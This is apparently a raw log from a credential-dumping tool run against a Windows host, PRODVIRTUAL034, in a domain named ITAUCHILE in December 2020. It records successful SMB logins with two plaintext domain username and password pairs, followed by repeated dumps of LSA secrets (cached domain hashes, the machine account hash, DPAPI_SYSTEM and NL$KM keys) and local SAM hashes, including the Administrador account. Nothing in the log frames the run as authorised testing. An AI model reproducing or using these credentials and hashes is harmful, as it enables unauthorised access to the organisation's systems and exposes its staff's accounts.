12-22-2020 18:50:05 [*] PRODVIRTUAL034.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL034) (domain:ITAUCHILE)
12-22-2020 18:50:05 [+] PRODVIRTUAL034.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:50:57 [*] PRODVIRTUAL034.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL034) (domain:ITAUCHILE)
12-22-2020 18:50:57 [+] PRODVIRTUAL034.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:51:02 [+] PRODVIRTUAL034.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 18:51:07 EEAA4651:b2cd74ce8c9bffc27b152272de867141:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:51:08 CRPA0240:757c424e309989b08005df3e2151bcb9:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:51:09 CRPA0150:a35ea20ebf30fe565613f13fa0d071c5:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:51:12 ITAUCHILE\PRODVIRTUAL034$:aad3b435b51404eeaad3b435b51404ee:0609e5fe545831cd9ac9c5f9cbe08927:::
12-22-2020 18:51:14 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 18:51:15 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
12-22-2020 18:56:49 [*] PRODVIRTUAL034.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL034) (domain:ITAUCHILE)
12-22-2020 18:56:49 [+] PRODVIRTUAL034.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:56:54 [+] PRODVIRTUAL034.ITAUCHILE.CL:445 Dumping SAM hashes (uid:rid:lmhash:nthash):
12-22-2020 18:56:59 Administrador:500:aad3b435b51404eeaad3b435b51404ee:c52ad6000c1f996e1b77c1bb5f7b9420:::
12-22-2020 18:57:01 Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
12-22-2020 18:57:03 lcladmin:1003:aad3b435b51404eeaad3b435b51404ee:284a3b309f205e98013bef106c0ed3ae:::
12-22-2020 18:57:05 robotics:1004:aad3b435b51404eeaad3b435b51404ee:cb4b5cbea7a60c158491de4db84df8c1:::
12-22-2020 18:59:46 [*] PRODVIRTUAL034.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL034) (domain:ITAUCHILE)
12-22-2020 18:59:46 [+] PRODVIRTUAL034.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:59:51 [+] PRODVIRTUAL034.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 18:59:56 EEAA4651:b2cd74ce8c9bffc27b152272de867141:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:59:57 CRPA0240:757c424e309989b08005df3e2151bcb9:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:59:58 CRPA0150:a35ea20ebf30fe565613f13fa0d071c5:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:00:00 ITAUCHILE\PRODVIRTUAL034$:aad3b435b51404eeaad3b435b51404ee:0609e5fe545831cd9ac9c5f9cbe08927:::
12-22-2020 19:00:03 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 19:00:04 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
12-22-2020 21:07:15 [*] PRODVIRTUAL034.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL034) (domain:ITAUCHILE)
12-22-2020 21:07:16 [+] PRODVIRTUAL034.ITAUCHILE.CL:445 Login successful ITAUCHILE\USR_ROBOTIC:Usr.ROBOT19*
12-22-2020 21:07:21 [+] PRODVIRTUAL034.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 21:07:25 EEAA4651:b2cd74ce8c9bffc27b152272de867141:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:07:26 CRPA0240:757c424e309989b08005df3e2151bcb9:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:07:27 CRPA0150:a35ea20ebf30fe565613f13fa0d071c5:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:07:30 ITAUCHILE\PRODVIRTUAL034$:aad3b435b51404eeaad3b435b51404ee:0609e5fe545831cd9ac9c5f9cbe08927:::
12-22-2020 21:07:32 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 21:07:34 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
